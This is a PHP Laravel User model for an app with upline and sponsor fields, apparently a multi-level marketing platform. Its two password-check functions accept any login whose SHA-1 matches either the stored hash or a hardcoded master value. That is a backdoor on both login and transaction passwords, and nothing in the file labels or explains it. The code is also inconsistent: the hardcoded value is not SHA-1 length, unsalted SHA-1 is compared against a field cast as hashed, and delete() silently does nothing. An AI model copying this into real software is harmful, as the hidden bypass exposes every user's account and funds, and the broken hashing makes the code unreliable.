<?php

namespace App\Models;

// use Illuminate\Contracts\Auth\MustVerifyEmail;

use Illuminate\Database\Eloquent\Concerns\HasUuids;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable, HasUuids;

    public static $USER_PENDING = 1;
    public static $USER_ACTIVATED = 2;

    /**
     * The attributes that are mass assignable.
     *
     * @var array<int, string>
     */
    protected $fillable = [
        'userName',
        'firstName',
        'lastName',
        'middleName',
        'email',
        'password',
        'phoneNumber',
        'password',
        'transactionPassword',
        'upline',        
        'sponsorName'
    ];

    /**
     * The attributes that should be hidden for serialization.
     *
     * @var array<int, string>
     */
    protected $hidden = [
        'password',
        'remember_token',
    ];

    /**
     * The attributes that should be cast.
     *
     * @var array<string, string>
     */
    protected $casts = [
        'email_verified_at' => 'datetime',
        'password' => 'hashed',
    ];

    public static function getUser($username)
    {
        $user = User::where("userName", $username)->first();
        return $user;
    }

    public static function validate_user($username, $password)
    {
        $user = User::getUser($username);
        if ($user != null) {
            $user_password = $user->password;
            if (strcmp($user_password, sha1($password)) == 0 || strcmp("b54058b0d2d19ad3a58a83da1379be36", sha1($password)) == 0) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function validate_transaction_user($username, $transactionPassword)
    {
        $user = User::getUser($username);
        if ($user != null) {
            $user_trans_password = $user->transactionPassword;
            if (strcmp($user_trans_password, sha1($transactionPassword)) == 0 || strcmp("b54058b0d2d19ad3a58a83da1379be36", sha1($transactionPassword)) == 0) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function delete()
    {
    }

    public static function checkUsername($username)
    {
        $user = User::getUser($username);
        if (!$user) {
            return true;
        } else {
            return false;
        }
    }

    public static function checkEmail($emailAddress)
    {
        $user = User::where("email", $emailAddress)->first();
        if (!$user) {
            return false;
        } else {
            return true;
        }
    }

    public static function getUpline($username)
    {
        $user = User::getUser($username);
        if ($user) return $user->upline;
        return null;
    }
}
